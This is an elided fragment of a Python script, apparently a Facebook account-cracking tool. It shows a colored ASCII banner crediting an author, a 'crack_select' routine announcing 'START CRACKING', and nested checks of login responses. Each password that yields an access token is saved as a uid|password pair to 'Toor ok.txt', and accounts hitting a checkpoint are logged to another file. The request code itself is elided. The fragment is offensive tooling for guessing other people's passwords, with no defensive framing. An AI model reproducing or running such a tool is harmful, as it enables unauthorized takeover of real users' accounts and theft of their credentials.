...
logo = """
     \033[1;92mM"""bgd                   
      \033[1;92mMI    "Y                   
      \033[1;92m`MMb.      ,pW"Wq.  ,pP"Ybd 
      \033[1;92m`YMMNq. 6W'   `Wb 8I   `" 
      \033[1;92m`MM 8M     M8 `YMMMa. 
      \033[1;92mdM YA.   ,A9 L.   I8 
      \033[1;92mMb     dM YA.   ,A9 L.   I8 
      \033[1;92mP"Ybmmd"   `Ybmd9'  M9mmmP' 
\033[1;93m----------------------------------------------------------------------------------------------------------
 \033[1;93m(*)\033[1;92m Author: https://www.facebook.com/NaZerkhaN521
 \033[1;93m(*)\033[1;92m WhatsApp :   +Kiss k Guta
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print(logo)
			print('')
			print("  Nazir_Khan START CRACKING.....")
			print('')
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							if "access_token" in q:
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [ToorOK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("Toor ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															if "access_token" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [Nazit-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("Nazir cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
